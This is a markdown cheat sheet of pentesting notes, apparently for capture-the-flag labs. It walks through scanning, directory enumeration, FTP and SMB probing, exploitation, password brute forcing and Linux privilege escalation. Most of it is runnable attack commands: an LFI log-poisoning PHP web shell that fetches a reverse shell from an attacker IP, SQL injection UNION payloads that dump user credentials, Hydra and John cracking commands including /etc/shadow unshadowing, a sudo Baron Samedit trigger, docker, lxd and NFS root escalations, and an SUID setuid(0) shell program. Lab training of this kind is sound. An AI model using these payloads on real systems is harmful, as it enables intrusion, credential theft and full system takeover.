# Pentesting (Concise Notes)

|No.|Steps|
|---|---|
|1|Scanning|
|2|Enumeration|
|3|Services|
|4|Exploitation|
|5|Bruteforce|
|5|Post-Exploitation|


## Scanning

|No.|Tool|Command|
|---|---|---|
|1|Threader3000|`threader3000 10.11.67.208`|
|2|Autorecon|`autorecon 10.11.67.208`|
|3|Nmap| `nmap -sn 192.168.102.0/24 -T4 -oN discovery.nmap`<br>`nmap -iL output.txt -T4 -sV -sC -p- -Pn -n --open -A -oN version.nmap`<br>`nmap script=vuln 192.168.193.211`

## Enumeration

|No.|Tool|Command|
|---|---|---|
|1|Gobuster| `gobuster dir -u <target site> -w  /usr/share/seclists/Discovery/Web-content/directory-list-lowercase-2.3-big.txt -t 200 -q` <br> `gobuster dir -x php,txt -u 172.27.65.31 -w /usr/share/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 200 -q` (To find php files as well as folders)|
|2|Dirsearch| `dirsearch -u 10.10.255.124 -X -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt `<br> `dirsearch -u 172.16.64.140/project --auth-type=basic --auth=YWRtaW46YWRtaW4= -X -x 400,500 -r -f -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` (If page needs to login)
|3|Wpscan| `wpscan --url somewebsite.com --enumerate u,ap,at,cb,dbe`|

## Services

|Ports|Services|Tool|Command|
|---|---|---|---|
|21|FTP|nmap <br> ftp (anonymous login) <br> ftp (download all files)|`nmap --script ftp-* -p 21 10.11.67.208` <br> anonymous:anonymous, anonymous:, ftp:ftp <br> `wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98`|
|139, 445|SMB|smbclient (List shares) <br> smbclient (Connect to shares) <br> enum4linux <br> nmap|`smbclient -L //10.130.40.80 -N` <br> `smbclient  //10.10.215.173/milesdyson -U=milesdyson` <br> `enum4linux -a 10.11.67.208` <br> `nmap -script=smb-enum-share`|

## Exploitation

|Vulnerability|Signs|Method|Command|
|---|---|---|--|
|Local File Inclusion|files being included in GET parameter| 1. Try to view the server file (view the blacklist) <br> 2. Log poisoning| `/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`<br> <br> <br> <br> <br> User-Agent: `<?php system($_GET['cmd']); ?>` <br> `/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=wget+http%3a//10.11.67.208%3a8023/php-reverse-shell.php`|
|SQL Injection| Login/Register form fields| 1. Find out number of columns present. <br> 2. Determine which cols have string data type. <br> 3. Show the databases <br> 4. Show tables in that DB. <br> 5. Show the columns in that table <br> 6. Dump data from cols.| `' UNION SELECT NULL -- -`, `' UNION SELECT NULL,NULL -- -` … <br> `' UNION SELECT 'a', NULL, NULL -- -`, `' UNION SELECT NULL, 'a', NULL -- -`, `' UNION SELECT NULL, NULL, 'a' -- - ` <br> `' UNION SELECT NULL, NULL, database() -- -` <br> `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'` <br> `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'` <br> `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`|
|Wordpress Rev Shell| Obtained credentials for `/wp-admin` | 1. Go to `Theme Editor` <br> 2. Upload Rev Shell on 404 page. <br> 3. Access it on `/wp-content/themes/twentyseventeen/404.php`| N/A|

## Bruteforce

|Tool|Purpose|Usage|
|---|---|---|
|Hashcat|Cracking hashes|1. Identify hashes using `hash-identifier` <br> 2. See example hashes [here](https://hashcat.net/wiki/doku.php?id=example_hashes) <br> 3. `hashcat -m 13100 -a 0 kerberos.hash /usr/share/wordlists/rockyou.txt`|
|John the Ripper|Crack Linux hashes <br> Crack MD5 <br> Crack SSH keys<br> Crack ASC keys <br> Crack specific users| `unshadow /etc/passwd /etc/shadow > crackme` <br> `john crackme --wordlist=rockyou.txt --format=Raw-MD5` <br> `python ssh2john.py id_rsa > id_rsa.hash` <br> `gpg2john tryhackme.asc > hash` <br> `john --wordlist=rockyou.txt -users=victim,victim2 crackme`|
|Wpscan|Bruteforcing `/wp-admin`| `wpscan --url http://test.local/ --passwords passwords.txt`|
|Hydra| Bruteforcing SSH/FTP/SMB <br> Bruteforce Website login <br> Bruteforce Digest Auth <br> Bruteforce Basic Auth| `hydra -t 4 -V -f -l lennie -P /usr/share/wordlists/rockyou.txt 10.10.13.33 ssh/ftp/smb` <br>  `hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L <wordlist of username> -P <wordlist of passwords> -f -V` <br> `hydra -l "carlos" -P /usr/share/wordlists/rockyou.txt www.spiros.ml http-get /auth/digest.php -S` (For HTTP, omit the -S switch) <br> `hydra -l "peter" -P /usr/share/wordlists/rockyou.txt www.spiros.ml http-head /auth/basic.php -S`|

## Post-Exploitation

|Purpose|Command|
|---|---|
|OS Architecture| `uname -a` <br> `wmic os get osarchitecture`|
|Stabilize Shell|1. `python3 -c 'import pty;pty.spawn("/bin/bash")'` <br> 2. `export TERM=xterm` <br> 3. `CTRL-Z` <br> 4. `stty raw -echo; fg `|
|Transfer Files| `python -m SimpleHTTPServer 53` <br> `python3 -m http.server 8023` <br> `wget http://<attacker's ip>/<filename>` <br> `curl.exe http://10.11.67.208:8000/output.dll --output output.dll` <br> `powershell -c "Invoke-WebRequest -Uri 'http://10.8.50.72:8000/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"`|
|Writable Locations| `/tmp` <br> `C:\\Windows\Tasks ` <br> `C:\\Windows\Temp `|
|Finding flag files| `find / -iname "flag*" 2>/dev/null` <br> 1.` cd /` <br>  2. `dir /s flag.txt` <br> 3.` type C:\Users\thegrinch\Documents\flag.txt`|

## Privilege Escalation

### Linux

|Method|Steps|
|---|---|
|[linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/tag/20220821)| 1. `wget http://10.11.67.208:8023/linpeas.sh` <br> 2. `chmod +x linpeas.sh` <br> 3. `./linpeas.sh` <br> `ssh -p 3306 user@challenge.nahamcon.com < linpeas.sh`|
|[unix-privesc-check](http://pentestmonkey.net/tools/unix-privesc-check)| `./unix-privesc-check standard > output.txt `
|`sudo -l` | `(ALL, !root) NOPASSWD` -->  https://www.exploit-db.com/exploits/47502 <br> `(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` --> Put library in current directory (`sudo -u rabbit`) to run as rabbit user <br> `(ALL) SETENV: /usr/bin/python3.7 /tmp/hijack.py` --> `sudo PYTHONPATH=/tmp /usr/bin/python3.7 /tmp/hijack.py` `python3 -c 'import sys; print("\n".join(sys.path))'` --> to view the Python Path (look for broken privileges)|
|`sudo sudo -V` (sudo versions: legacy v1.8.2-1.8.31p2 , stable v1.9.0-1.9.5p1)|  `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` --> if `malloc(): memory corruption` means exploitable to [Baron Samedit](https://github.com/blasty/CVE-2021-3156) <br> `cat /etc/*release` <br>`./sudo-hax-me-a-sandwich 0`|
|SUID/SGID bit|`find / -type f -perm -04000 -ls 2>/dev/null` <br> [GTFObins](https://gtfobins.github.io/)|
|Capabilities (more granular privilege management) | `getcap -r / 2>/dev/null` |
|Cron Jobs| `ls -lah /etc/cron*` <br> `cat /etc/crontab`|
|PATH| `echo $PATH` <br> `find / -writable 2>/dev/null \| cut -d "/" -f 2,3 \| grep -v proc \| sort -u` <br> `export PATH=/tmp:$PATH`|
|Docker| If `.dockerenv` is present in `/` directory. <br> `docker images` <br> `docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash`|
|`id` (belongs to lxd or lxc group)| 1. Install [System container image builder](https://github.com/lxc/distrobuilder) on attacker<br> 2. `make` <br> 3. `mkdir -p $HOME/ContainerImages/alpine/` <br> 3. `cd $HOME/ContainerImages/alpine/; wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml` <br> 4. `sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8` <br> 5. Upload lxd.tar.xz and rootfs.squashfs to victim <br> 6. `lxc image import lxd.tar.xz rootfs.squashfs --alias alpine` <br> 7. `lxc image list` <br> 8. `lxc init alpine privesc -c security.privileged=true --alias=alpine` <br> 9. `lxc list` <br> 10. `lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true` <br> 11. `lxc start privesc` <br> 12. `lxc exec privesc /bin/sh` <br> If `Error: No storage pool found.` --> run `lxd init` and repeat the steps.|
| Network File Sharing | Victim: `cat /etc/exports` (`no_root_squash`) present → create executable with SUID) <br> Attacker: `showmount -e 10.10.44.226` <br> Attacker: `mount -o rw 10.10.44.226:/tmp /home/kali/Documents/tryhackme/linprivesc/tmp` <br> Attacker: Create [nfs](#nfs) <br> Attacker: `gcc nfs.c -o nfs -w` <br> Attacker: `chmod +s nfs` <br> Victim: `cd /tmp; ./nfs`|
|Obtain root outside of container| `chmod +s /bin/bash` <br> `/bin/bash -p`|  


### Windows 

|Method|Steps|
|---|---|











### nfs
```c

int main(){
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}

```





